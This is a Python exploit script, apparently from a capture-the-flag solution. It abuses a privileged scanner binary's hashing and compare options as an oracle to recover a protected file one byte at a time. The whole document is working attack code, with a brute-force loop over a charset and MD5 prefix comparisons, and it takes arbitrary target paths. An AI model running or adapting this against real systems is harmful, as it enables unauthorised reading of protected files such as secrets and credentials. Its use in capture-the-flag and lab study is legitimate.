#!/usr/bin/python3    
                                                 
'''                            
  The idea is this:
  If the hash of the first byte of the flag (using the flag as the 'image') matches
  the hash of the first byte of a sequence of values ranging from 0 to 255, then we                                                                                                                  
  just found the first character of the flag.
  Repeat this process for lengths all the way up to 32 to obtain the whole flag.
  (This is a variation on the known-plaintext attack)
'''                   

import subprocess                           
import itertools                                                                                                                                                                                     
import argparse                                                                                   

test_image = '/tmp/Tools/testimage'
program = '/opt/scanner/scanner'              
dummy_hashes = '/home/greg/dmca_hashes.test'
                                                                                                  
charset = range(128)                                                                              
                                                                                                  
parser = argparse.ArgumentParser(                                                                 
    prog='known-plaintext.py',
    description='Read characters from the target file one by one, by comparing MD5 hashes of the target file to a test/temp file.',
    epilog='Author: 4wayhandshake')

parser.add_argument('target', help='The absolute path of the file to read.', type=str)
parser.add_argument('length', help='The expected length of the file to read. Overestimate if youre not sure.', type=int)
parser.add_argument("--hex", action="store_true", help="Guess hexadecimal characters only (up to 8x faster)")

args = parser.parse_args()
target_file = args.target
max_length = args.length
if args.hex:
        charset = [ord(x) for x in list('0123456789abcdef')]

def write_test_image(known_bytes, x):
        # open the testimage file
        with open(test_image, 'wb') as f:
                # Stick some binary data in there
                f.write(bytes(known_bytes+[x]))

def read_test_image():
        with open(test_image, 'rb') as f:
                print(f.read())

def get_target_hash(length):
        s = subprocess.check_output([program, '-c', target_file, '-l', str(length), '-p', '-h', dummy_hashes], shell=False)
        try:
                return s.decode('utf-8').split(' has hash ')[1][:32]
        except:
                return

def compare_image_hash(target_hash, length):
        s = subprocess.check_output([program, '-c', test_image, '-l', str(length), '-p', '-s', target_hash], shell=False)
        return s.decode('utf-8').find(' matches '+test_image) >= 0

found_bytes = []
for length in range(1,max_length+1):
        reference_hash = get_target_hash(length)
        for byte_value in charset:
                write_test_image(found_bytes, byte_value)
                if (compare_image_hash(reference_hash, length)):
                        found_bytes.append(byte_value)
                        print(bytes(found_bytes).decode('utf-8'), end='\r')
                        break

print('\n')
